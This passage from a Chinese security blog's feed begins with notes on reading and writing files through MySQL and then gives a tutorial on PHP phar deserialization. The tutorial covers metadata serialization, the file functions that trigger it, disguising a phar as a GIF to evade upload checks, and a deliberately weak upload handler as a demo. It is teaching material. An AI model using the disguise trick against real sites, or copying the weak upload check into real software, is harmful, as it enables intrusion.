&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;该文件虽然可写入，但创建者是mysql用户&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 2204; 
			flex-basis: 5290px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/mysql-2/image-20220213165117905.png&#34; data-size=&#34;529x24&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/mysql-2/image-20220213165117905.png&#34;
			width=&#34;529&#34;
			height=&#34;24&#34;
			srcset=&#34;https://coollllllll.github.io/p/mysql-2/image-20220213165117905_hu46f4bf0182ae66b027a3c4db79ad741f_6609_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/mysql-2/image-20220213165117905_hu46f4bf0182ae66b027a3c4db79ad741f_6609_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;假设该文件是.php，访问该文件会出现500状态码，所以大多数在Windows上会成功，而Linux基本不行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;读文件&#34;&gt;读文件&lt;/h2&gt;
&lt;h3 id=&#34;注意点-2&#34;&gt;注意点&lt;/h3&gt;
&lt;p&gt;load_file函数中的路径可以是单引号或0x、char转换的字符，但是路径中的斜杠是/而不是\&lt;/p&gt;
&lt;h3 id=&#34;前提条件-2&#34;&gt;前提条件&lt;/h3&gt;
&lt;p&gt;所读文件的绝对路径&lt;/p&gt;
&lt;p&gt;secure_file_priv&lt;/p&gt;
&lt;p&gt;file_priv&lt;/p&gt;
</description>
        </item>
        <item>
        <title>PHP 反序列化-2</title>
        <link>https://coollllllll.github.io/p/php-2/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/php-2/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/php-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post PHP 反序列化-2" /&gt;&lt;h1 id=&#34;php反序列化-2&#34;&gt;PHP反序列化-2&lt;/h1&gt;
&lt;h2 id=&#34;phar&#34;&gt;Phar&lt;/h2&gt;
&lt;p&gt;phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在phar manifest 。其中会以&lt;strong&gt;序列化的形式存储用户自定义的meta-data&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 283; 
			flex-basis: 679px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-2/image-20220221111626151.png&#34; data-size=&#34;1048x370&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-2/image-20220221111626151.png&#34;
			width=&#34;1048&#34;
			height=&#34;370&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-2/image-20220221111626151_hu8d458af0903000f08a1ba89963168d09_52344_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-2/image-20220221111626151_hu8d458af0903000f08a1ba89963168d09_52344_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;phar使用示例&#34;&gt;Phar使用示例&lt;/h2&gt;
&lt;p&gt;手动构建phar文件，&lt;strong&gt;需要配置php.ini中phar.readonly选项设置为Off，否则无法生成phar文件。&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Test&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 临时的类，用来生成对象即可
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Phar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;test.phar&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//后缀名必须为phar
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;startBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setStub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//设置stub
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;haha&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setMetadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$o&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//将自定义的meta-data存入manifest
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addFromString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;test.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;testHAHA&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//添加要压缩的文件
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//签名自动计算
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;stopBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行该PHP文件，生成&lt;code&gt;test.phar&lt;/code&gt;文件，打开观察meta-data是否被序列化：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1578; 
			flex-basis: 3789px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-2/image-20220221113622850.png&#34; data-size=&#34;1121x71&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-2/image-20220221113622850.png&#34;
			width=&#34;1121&#34;
			height=&#34;71&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-2/image-20220221113622850_huba1321fd946cdba3d774d4cb576f529c_18859_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-2/image-20220221113622850_huba1321fd946cdba3d774d4cb576f529c_18859_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;确实存在序列化，以&lt;code&gt;file_get_contents()&lt;/code&gt;函数为例，观察在解析phar文件时得反序列化结果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Test&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;phar://test.phar/test.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1194; 
			flex-basis: 2865px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-2/image-20220221144440521.png&#34; data-size=&#34;406x34&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-2/image-20220221144440521.png&#34;
			width=&#34;406&#34;
			height=&#34;34&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-2/image-20220221144440521_hu564766f838d03bfe368a158cc8cccfa1_7355_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-2/image-20220221144440521_hu564766f838d03bfe368a158cc8cccfa1_7355_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;那么还有哪些函数在通过&lt;code&gt;phar://&lt;/code&gt;伪协议解析phar文件时，会将meta-data进行反序列化呢？&lt;/p&gt;
&lt;p&gt;参考：https://blog.zsxsoft.com/post/38&lt;/p&gt;
&lt;p&gt;总结出：除了下列常见文件系统函数，凡是在实现过程中直接或间接调用了&lt;code&gt;php_stream_open_wrapper&lt;/code&gt;，都可能触发phar反序列化漏洞。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fileatime&lt;/code&gt; / &lt;code&gt;filectime&lt;/code&gt; / &lt;code&gt;filemtime&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;stat&lt;/code&gt; / &lt;code&gt;fileinode&lt;/code&gt; / &lt;code&gt;fileowner&lt;/code&gt; / &lt;code&gt;filegroup&lt;/code&gt; / &lt;code&gt;fileperms&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file&lt;/code&gt; / &lt;code&gt;file_get_contents&lt;/code&gt; /&lt;code&gt;file_put_contents&lt;/code&gt; &lt;code&gt;readfile&lt;/code&gt; / &lt;code&gt;fopen&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;file_exists&lt;/code&gt; / &lt;code&gt;is_dir&lt;/code&gt; / &lt;code&gt;is_executable&lt;/code&gt; / &lt;code&gt;is_file&lt;/code&gt; / &lt;code&gt;is_link&lt;/code&gt; / &lt;code&gt;is_readable&lt;/code&gt; / &lt;code&gt;is_writeable&lt;/code&gt; / &lt;code&gt;is_writable&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;parse_ini_file&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unlink&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;copy&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;将phar文件进行伪造&#34;&gt;将phar文件进行伪造&lt;/h2&gt;
&lt;p&gt;php识别phar文件是通过其文件头的stub，更确切一点来说是&lt;code&gt;__HALT_COMPILER();&lt;/code&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Test&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Phar&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;img.phar&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;startBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;setStub&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;GIF89a&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php __HALT_COMPILER();?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;//设置stub，增加gif文件头
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addFromString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;testHAHA&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//添加要压缩的文件
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;haha&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;setMetadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;//将自定义meta-data存入manifest
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nv&#34;&gt;$phar&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;stopBuffering&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 2041; 
			flex-basis: 4900px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-2/image-20220221145644601.png&#34; data-size=&#34;1123x55&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-2/image-20220221145644601.png&#34;
			width=&#34;1123&#34;
			height=&#34;55&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-2/image-20220221145644601_hud2c32f46ff8efae7b8f2856de3c11574_20843_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-2/image-20220221145644601_hud2c32f46ff8efae7b8f2856de3c11574_20843_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;修改后缀名可以继续反序列化，同时该文件在上传时一般可绕过上传检测。&lt;/p&gt;
&lt;h2 id=&#34;phar反序列化漏洞利用&#34;&gt;Phar反序列化漏洞利用&lt;/h2&gt;
&lt;h3 id=&#34;条件&#34;&gt;条件&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;phar文件要能够上传到服务器端&lt;/li&gt;
&lt;li&gt;要有可用的魔术方法作为“跳板”&lt;/li&gt;
&lt;li&gt;文件操作函数的参数可控，且&lt;code&gt;:&lt;/code&gt;、&lt;code&gt;/&lt;/code&gt;、&lt;code&gt;phar&lt;/code&gt;等特殊字符没有被过滤&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;示例&#34;&gt;示例&lt;/h3&gt;
&lt;p&gt;index.html:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
	&amp;lt;title&amp;gt;upload file&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;form action=&amp;quot;upload.php&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
    &amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot; /&amp;gt;
    &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;Upload&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;upload.php:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 仅允许格式为gif的文件上传。上传成功的文件会存储到upload_file目录下。
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;image/gif&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;strrpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;gif&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Upload: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Type: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Temp file: &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;upload_file/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; already exists. &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
      &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nx&#34;&gt;move_uploaded_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
